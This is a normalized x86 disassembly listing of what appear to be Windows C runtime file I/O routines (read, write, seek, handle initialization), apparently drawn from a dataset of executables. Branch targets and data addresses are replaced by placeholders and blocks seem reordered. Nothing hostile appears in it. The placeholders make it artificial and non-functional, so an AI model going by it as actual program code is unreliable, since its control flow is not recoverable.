mov ax [ edi ]
mov [ esi ] ax
add esi 0x2
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xfffffffe
cmp edi eax
jae r-xdata
mov [ esi ] ax
jmp r-xdata
cmp ecx edx
jb r-xdata
push 0xa
add ecx 0x2
pop eax
cmp [ ecx ] ax
je r-xdata
movzx eax al
xor edx edx
inc edx
cmp [ eax + rw-data ] 0x0
jne r-xdata
inc esi
jmp r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edx * 4 + rw-data ]
inc edi
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
cmp edi [ ebp - 0x1c ]
jb r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edx * 4 + rw-data ]
add edi 0x2
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push 0xa
pop edx
cmp [ edi + 0x2 ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
add esi 0x2
add edi 0x2
jmp r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov [ esi ] ax
add esi 0x2
push 0xd
pop eax
push eax
pop edi
movzx eax [ esi ]
movsx eax [ eax + rw-data ]
test eax eax
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x28 ]
mov edi [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
sub esi edi
push esi
push edi
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cl
inc esi
mov edi eax
jmp r-xdata
push 0xa
pop eax
add edi 0x2
mov [ esi ] al
jmp r-xdata
mov al [ edi ]
cmp al 0x1a
je r-xdata
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cx
push 0xa
pop eax
add edi 0x4
mov [ esi ] ax
jmp r-xdata
cmp edi [ ebp - 0x20 ]
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_427b11
mov [ eax ] 0x2a
jmp r-xdata
mov ebx [ ebp - 0x24 ]
cmp esi ebx
jb r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov eax [ eax * 4 + rw-data ]
cmp edi esi
setne cl
add edi edi
mov [ eax + ebx + 0x30 ] ecx
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cl
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cx
add esi 0x2
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
add esi 0x2
jmp r-xdata
movzx eax [ edi ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x48
je r-xdata
add esi edx
jmp r-xdata
dec esi
inc edx
movzx eax [ esi ]
cmp [ eax + rw-data ] 0x0
je r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x1 ] al
jne r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x8 ] ax
jne r-xdata
neg edx
mov eax edx
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_42cb83
add esp 0x10
mov al [ esi ]
inc esi
mov [ ecx + ebx + 0x5 ] al
mov eax [ ebp - 0xc ]
cmp edx 0x2
jl r-xdata
cmp edx 0x4
jg r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_42cb83
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
jne r-xdata
mov [ esi ] 0xd
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x1 ]
inc esi
mov [ ecx + ebx + 0x5 ] al
jmp r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_42cb83
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
jne r-xdata
pop eax
mov [ esi ] ax
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x8 ]
mov [ ecx + ebx + 0x5 ] al
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x7 ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ edx * 4 + rw-data ]
push 0xa
pop ecx
add esi 0x2
mov [ eax + ebx + 0x26 ] cl
mov [ esi ] ax
add esi 0x2
jmp r-xdata
cmp edx 0x3
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ ebp - 0xc ]
inc esi
push 0xd
push 0xd
pop ecx
mov [ esi ] cl
mov [ esi ] al
inc esi
pop ecx
push 0xd
push 0xd
pop ecx
mov [ esi ] cx
mov [ esi ] ax
add esi 0x2
jmp r-xdata
pop ecx
sub esi edx
jmp r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x26 ] al
inc esi
sub_42c027
push 0x10
push r--data
call sub_429ad0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
jmp r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
call sub_42a231
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_434fa5
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_427add
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_42c109
add esp 0xc
mov edi eax
jmp r-xdata
call sub_429b15
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42c0e0
mov eax edi
jmp r-xdata
sub_42c109
push ebp
mov ebp esp
mov eax 0x1af0
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor edx edx
push edi
mov edi edx
mov [ ebp - 0x1ac0 ] eax
mov [ ebp - 0x1abc ] ecx
mov [ ebp - 0x1ac4 ] edi
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] edx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
shl esi 0x6
mov [ ebp - 0x1ad0 ] ecx
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x1aec ] esi
mov bl [ esi + ecx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_427add
and [ eax ] edi
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_421ed7
leave
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac0 ]
call sub_427add
and [ eax ] edi
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
jmp r-xdata
test [ esi + ecx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_433ef7
pop ecx
test eax eax
je r-xdata
push 0x2
push edx
push edx
push eax
call sub_42cb83
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
pop esi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1abc ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
xor esi esi
mov [ ebp - 0x1ac8 ] esi
test bl bl
jne r-xdata
call sub_42f4f6
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae4 ]
push eax
mov eax [ ebp - 0x1ad0 ]
sete cl
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov edi [ ebp - 0x1ad8 ]
xor esi esi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov eax edx
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] esi
jbe r-xdata
cmp [ ebp - 0x1ac0 ] edi
je r-xdata
sub edi [ ebp - 0x1ad4 ]
mov eax edi
test esi esi
je r-xdata
mov edx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1adc ] ecx
test ebx ebx
je r-xdata
mov [ ebp - 0x1ac0 ] ecx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad0 ]
mov ecx [ ebp - 0x1aec ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
sub eax edx
mov edx [ ebp - 0x1ac4 ]
lea ebx [ ebp - 0x1ab8 ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1abc ]
and [ ebp - 0x1adc ] edi
mov ecx edx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test bl bl
je r-xdata
push 0x5
pop ebx
cmp esi ebx
jne r-xdata
mov [ ebp - 0x1ae8 ] 0xa
mov [ ebp - 0x1ae8 ] 0xa
call sub_427b11
mov [ eax ] 0x1c
call sub_427add
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1add ] cl
cmp cl 0xa
mov ecx [ ebp - 0x1ac0 ]
mov [ ebp - 0x1ac4 ] edx
jne r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ae8 ] 0xa
push esi
call sub_427af0
pop ecx
jmp r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_427add
mov [ eax ] ebx
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] eax
test eax eax
je r-xdata
movzx edi [ esi ]
add esi 0x2
add ecx 0x2
mov [ ebp - 0x1adc ] esi
cmp di [ ebp - 0x1ae8 ]
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0x1ad4 ] edi
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
test eax eax
je r-xdata
movzx esi [ ecx ]
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1ac0 ] ecx
cmp si [ ebp - 0x1ae8 ]
jne r-xdata
xor eax eax
jmp r-xdata
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov dl [ ebp - 0x1add ]
mov [ ebx ] dl
mov edx [ ebp - 0x1ac4 ]
inc ebx
inc ecx
mov [ ebp - 0x1ac0 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1ad4 ]
mov [ ebx ] 0xd
inc ebx
inc ecx
cmp bl 0x1
je r-xdata
mov cl [ ecx ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad0 ]
mov edx [ eax * 4 + rw-data ]
cmp [ esi + edx + 0x38 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] di
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop esi
mov [ eax ] si
mov esi [ ebp - 0x1adc ]
add eax 0x2
add edx 0x2
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
mov [ ebp - 0x1ac4 ] edi
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov [ ebx ] si
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
push 0xd
pop ecx
mov [ ebx ] cx
mov ecx [ ebp - 0x1ac0 ]
add edi 0x2
add ebx 0x2
add edx 0x2
test edi edi
jne r-xdata
mov eax [ ebp - 0x1ac4 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
mov eax [ ebp - 0x1ac4 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
movzx eax [ ecx ]
xor edx edx
cmp ax [ ebp - 0x1ae8 ]
mov [ ebp - 0x1ac4 ] eax
mov eax [ ebp - 0x1ac8 ]
sete dl
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax cl
push eax
call sub_432c4d
pop ecx
test eax eax
je r-xdata
mov al [ esi + edx + 0x34 ]
mov [ ebp - 0xc ] al
push 0x2
lea eax [ ebp - 0xc ]
mov [ ebp - 0xb ] cl
and [ esi + edx + 0x38 ] 0x0
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov esi eax
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] esi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ad8 ]
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac0 ]
mov eax ecx
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1ac4 ]
call sub_43536b
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1acc ]
mov eax [ ebp - 0x1abc ]
mov edx [ ebp - 0x1acc ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_434ef2
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1adc ]
mov edx [ ebp - 0x1abc ]
mov edi ecx
sub edi edx
mov [ ebp - 0x1ac4 ] edi
cmp edi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ad8 ]
push edx
push eax
lea eax [ ebp - 0x1410 ]
add eax ecx
mov ecx [ ebp - 0x1aec ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov edi [ ebp - 0x1ad4 ]
mov eax ecx
sub eax edx
mov edx [ ebp - 0x1ae4 ]
lea ebx [ ebp - 0x1ab8 ]
jmp r-xdata
add edi 0x2
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
mov eax [ ebp - 0x1acc ]
mov ebx [ ebp - 0x1ad0 ]
mov al [ edx ]
mov ecx [ ebx * 4 + rw-data ]
inc edi
mov [ esi + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ esi + eax + 0x38 ] 0x1
push 0x2
push edx
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_434ef2
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov esi [ ebp - 0x1adc ]
sub ecx edx
mov edx [ ebp - 0x1ae4 ]
lea eax [ ebp - 0x6b8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x1ac8 ]
mov ecx [ ebp - 0x1acc ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac4 ] eax
call sub_43536b
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1adc ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
inc eax
inc [ ebp - 0x1ac8 ]
jmp r-xdata
inc edi
inc [ ebp - 0x1ad4 ]
mov edi [ ebp - 0x1ac8 ]
mov eax [ ebp - 0x1ae4 ]
add edi [ ebp - 0x1ad4 ]
cmp [ ebp - 0x1adc ] eax
jl r-xdata
xor ecx ecx
push ecx
push ecx
inc eax
inc [ ebp - 0x1ac8 ]
push 0x5
mov [ ebp - 0x1acc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1ac4 ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ae4 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1adc ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0xc ] 0xd
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1adc ] 0x1
jl r-xdata
inc [ ebp - 0x1ad4 ]
inc edi
jmp r-xdata
sub_42c933
push 0x10
push r--data
call sub_429ad0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
jmp r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
call sub_42a231
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_434fa5
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_427add
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_42ca15
add esp 0xc
mov edi eax
jmp r-xdata
call sub_429b15
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42c9ec
mov eax edi
jmp r-xdata
sub_42ca15
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_43525c
pop ecx
cmp eax 0xffffffff
jne r-xdata
push ebx
push edi
push [ ebp + 0x10 ]
xor edi edi
push edi
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
call sub_427b11
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
test edi edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax ebx
push edi
call sub_427af0
pop ecx
or eax 0xffffffff
jmp r-xdata
pop edi
pop ebx
sub_42ca87
push 0x18
push r--data
call sub_429ad0
or esi 0xffffffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
jmp r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
call sub_42a231
cmp edi [ rw-data ]
jae r-xdata
mov edx esi
mov eax edi
sar eax 0x5
mov [ ebp - 0x1c ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_434fa5
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x1
je r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_427add
and [ eax ] 0x0
mov ebx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_42cb83
add esp 0x10
mov esi eax
mov ebx edx
jmp r-xdata
mov eax esi
call sub_429b15
retn
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42cb59
mov edx ebx
jmp r-xdata
sub_42cb83
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_43525c
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_427b11
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_427af0
pop ecx
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_42cc00
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_42cc2b
push 0x64
push r--data
call sub_429ad0
push 0xb
call sub_425b56
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_4266a7
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_42a620
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_429b15
retn
mov [ ebp - 0x2c ] ebx
cmp ebx 0x3
jge r-xdata
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42ced0
xor eax eax
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp [ esi ] 0xfffffffe
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_4266a7
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
jmp r-xdata
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + ebx * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi 0xfffffffe
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
